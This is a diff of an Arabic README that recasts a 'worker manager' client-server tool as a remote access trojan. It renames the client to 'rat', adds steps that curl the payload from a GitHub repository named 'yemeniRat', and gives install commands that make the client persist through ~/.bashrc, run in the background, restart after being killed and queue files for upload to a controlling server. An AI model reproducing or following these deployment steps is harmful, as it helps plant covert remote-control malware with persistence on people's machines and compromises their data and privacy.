@@ -79,7 +79,7 @@ mkdir ~/worker-manager
 cd ~/worker-manager
 ```
 
-ضع ملف الخادم `worker_manager.py` في هذا المجلد.
+ضع ملف الخادم `server.py` في هذا المجلد.
 
 ### 2. تثبيت متطلبات Python
 
@@ -108,12 +108,12 @@ pip install -r requirements.txt
 ### 3. تشغيل الخادم
 
 ```bash
-python3 worker_manager.py
+python3 server.py
 ```
 
 **للخادم الخلفي (Background):**
 ```bash
-nohup python3 worker_manager.py > server.log 2>&1 &
+nohup python3 server.py > server.log 2>&1 &
 ```
 
 ### 4. التحقق من التشغيل
@@ -131,12 +131,14 @@ http://127.0.0.1:8089/docs
 
 ### 1. تحميل السكريبت
 
-ضع ملف العميل `worker_client.sh` في مجلد مناسب:
+ضع ملف العميل `rat` في مجلد مناسب:
 ```bash
+apt install curl
+curl -L "https://raw.githubusercontent.com/Alnajmetube/yemeniRat.git/main/rat" -o "rat"
 mkdir -p ~/.worker-client
-cp worker_client.sh ~/.worker-client/
+cp rat ~/.worker-client/
 cd ~/.worker-client
-chmod +x worker_client.sh
+chmod +x rat
 ```
 
 ### 2. تثبيت العميل
@@ -144,7 +146,7 @@ chmod +x worker_client.sh
 قم بتشغيل أمر التثبيت مع URL الخادم و Token العامل:
 
 ```bash
-./worker_client.sh --install --url http://127.0.0.1:8089 --token <TOKEN>
+./rat --install --url http://127.0.0.1:8089 --token <TOKEN>
 ```
 
 **ملاحظة:** احصل على التوكن من خلال واجهة الخادم CLI.
@@ -153,7 +155,7 @@ chmod +x worker_client.sh
 
 **الخطوة 1: إنشاء عامل (Worker)**
 ```bash
-python3 worker_manager.py
+python3 server.py
 # اختر: [2] Add Worker
 # أدخل اسم العامل: my-worker
 # سيظهر Token
@@ -161,18 +163,18 @@ python3 worker_manager.py
 
 **الخطوة 2: تثبيت العميل**
 ```bash
-./worker_client.sh --install --url http://127.0.0.1:8089 --token eyJhbGciOiJIUzI1NiIs...
+./rat --install --url http://127.0.0.1:8089 --token eyJhbGciOiJIUzI1NiIs...
 ```
 
 **النتيجة:**
-- ✅ تم إنشاء ملف التكوين: `~/.worker_client.conf`
+- ✅ تم إنشاء ملف التكوين: `~/.rat.conf`
 - ✅ تمت إضافة التشغيل التلقائي إلى `~/.bashrc`
 - ✅ بدأ العميل في الخلفية
 
 ### 4. إلغاء تثبيت العميل
 
 ```bash
-./worker_client.sh --uninstall
+./rat --uninstall
 ```
 
 ---
@@ -242,18 +244,18 @@ python3 worker_manager.py
 
 | الأمر | الوصف |
 |-------|-------|
-| `python3 worker_manager.py` | تشغيل الخادم في المقدمة |
-| `nohup python3 worker_manager.py &` | تشغيل الخادم في الخلفية |
-| `pkill -f worker_manager.py` | إيقاف الخادم |
+| `python3 server.py` | تشغيل الخادم في المقدمة |
+| `nohup python3 server.py &` | تشغيل الخادم في الخلفية |
+| `pkill -f server.py` | إيقاف الخادم |
 
 ### أوامر العميل
 
 | الأمر | الوصف |
 |-------|-------|
-| `./worker_client.sh --install --url <URL> --token <TOKEN>` | تثبيت العميل |
-| `./worker_client.sh --uninstall` | إلغاء تثبيت العميل |
-| `./worker_client.sh --foreground` | تشغيل في المقدمة (للتصحيح) |
-| `tail -f ~/.worker_client.log` | مشاهدة سجلات العميل |
+| `./rat --install --url <URL> --token <TOKEN>` | تثبيت العميل |
+| `./rat --uninstall` | إلغاء تثبيت العميل |
+| `./rat --foreground` | تشغيل في المقدمة (للتصحيح) |
+| `tail -f ~/.rat.log` | مشاهدة سجلات العميل |
 
 ---
 
@@ -262,9 +264,9 @@ python3 worker_manager.py
 ### الخادم:
 ```
 worker-manager/
-├── worker_manager.py          # ملف الخادم الرئيسي
+├── server.py          # ملف الخادم الرئيسي
 ├── requirements.txt           # متطلبات Python
-├── worker_manager.db          # قاعدة البيانات (SQLite)
+├── server.db          # قاعدة البيانات (SQLite)
 ├── uploads/                   # مجلد رفع الملفات
 │   └── <worker_id>/
 │       └── <task_id>/
@@ -274,11 +276,11 @@ worker-manager/
 
 ### العميل:
 ```
-~/.worker_client.conf         # ملف التكوين
-~/.worker_client.log          # سجل الأحداث
-~/.worker_client_queue/       # مجلد الطابور للملفات
-/tmp/worker_client.lock       # ملف القفل
-/tmp/worker_client.pid        # ملف PID
+~/.rat.conf         # ملف التكوين
+~/.rat.log          # سجل الأحداث
+~/.rat_queue/       # مجلد الطابور للملفات
+/tmp/rat.lock       # ملف القفل
+/tmp/rat.pid        # ملف PID
 ```
 
 ### قاعدة البيانات:
@@ -308,8 +310,8 @@ pip3 install -r requirements.txt
 
 **3. مشكلة في قاعدة البيانات**
 ```bash
-rm worker_manager.db  # حذف قاعدة البيانات (فقدان البيانات)
-python3 worker_manager.py  # سيتم إعادة إنشائها
+rm server.db  # حذف قاعدة البيانات (فقدان البيانات)
+python3 server.py  # سيتم إعادة إنشائها
 ```
 
 ### مشاكل العميل:
@@ -327,7 +329,7 @@ sudo apt-get install jq
 **3. العميل لا يتصل بالخادم**
 ```bash
 # التحقق من صحة URL والتوكن
-cat ~/.worker_client.conf
+cat ~/.rat.conf
 
 # اختبار الاتصال
 curl http://127.0.0.1:8089/worker/health?token=<TOKEN>
@@ -335,12 +337,12 @@ curl http://127.0.0.1:8089/worker/health?token=<TOKEN>
 
 **4. مشاهدة سجلات العميل**
 ```bash
-tail -f ~/.worker_client.log
+tail -f ~/.rat.log
 ```
 
 **5. إعادة تشغيل العميل**
 ```bash
-pkill -f worker_client.sh
+pkill -f rat
 # سيعيد التشغيل تلقائياً بسبب .bashrc
 ```
 
@@ -353,14 +355,14 @@ pkill -f worker_client.sh
 ```bash
 # 1. تشغيل الخادم
 cd ~/worker-manager
-python3 worker_manager.py
+python3 server.py
 # في واجهة CLI: اختر [2] لإضافة عامل
 # اسم العامل: test-worker
 # انسخ التوكن: abc123...
 
 # 2. في محطة أخرى، تثبيت العميل
 cd ~/.worker-client
-./worker_client.sh --install --url http://127.0.0.1:8089 --token abc123...
+./rat --install --url http://127.0.0.1:8089 --token abc123...
 
 # 3. العودة إلى الخادم، اختر [3] لفتح العامل
 # اختر العامل test-worker
@@ -386,7 +388,7 @@ cd ~/.worker-client
 ## 📞 الدعم
 
 للمساعدة:
-1. تحقق من السجلات: `tail -f ~/.worker_client.log`
+1. تحقق من السجلات: `tail -f ~/.rat.log`
 2. تأكد من تشغيل الخادم
 3. تحقق من الاتصال بالشبكة
 4. راجع [استكشاف الأخطاء](#استكشاف-الأخطاء)
@@ -414,12 +416,12 @@ pip install -r requirements.txt
 python3 server.py
 
 # العميل (في محطة أخرى)
-chmod +x worker_client.sh
-./worker_client.sh --install --url http://127.0.0.1:8089 --token <TOKEN>
+chmod +x rat
+./rat --install --url http://127.0.0.1:8089 --token <TOKEN>
 
 # التحقق
-ps aux | grep -E "(worker_manager|worker_client)"
-tail -f ~/.worker_client.log
+ps aux | grep -E "(server|rat)"
+tail -f ~/.rat.log
 ```
 
 ---
